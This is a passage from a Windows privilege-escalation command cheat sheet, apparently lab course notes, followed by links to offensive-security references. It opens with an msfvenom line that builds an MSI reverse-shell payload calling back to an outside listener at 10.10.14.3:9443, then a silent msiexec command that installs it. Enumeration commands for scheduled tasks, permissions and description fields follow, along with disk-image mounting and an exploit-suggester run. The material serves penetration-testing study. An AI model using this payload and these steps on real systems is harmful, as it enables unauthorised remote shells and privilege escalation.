msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

#Execute an MSI package from command line
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

#Enumerate scheduled tasks
schtasks /query /fo LIST /v

#Enumerate scheduled tasks with PowerShell
Get-ScheduledTask | select TaskName,State

#Check permissions on a directory
.\accesschk64.exe /accepteula -s -d C:\Scripts\

#Check local user description field
Get-LocalUser

#Enumerate computer description field
Get-WmiObject -Class Win32_OperatingSystem | select Description

#Mount VMDK on Linux
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd

#Mount VHD/VHDX on Linux
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

#Update Windows Exploit Suggester database
sudo python2.7 windows-exploit-suggester.py --update

#Run Windows Exploit Suggester
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

```

## Useful Resources

[SwissKeyReo - Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation)

[HackTriks](https://book.hacktricks.xyz/)

[WADCOMS](https://wadcoms.github.io/#+SMB+Windows)

[GTFOBins](https://gtfobins.github.io/)

[SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)

[Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)

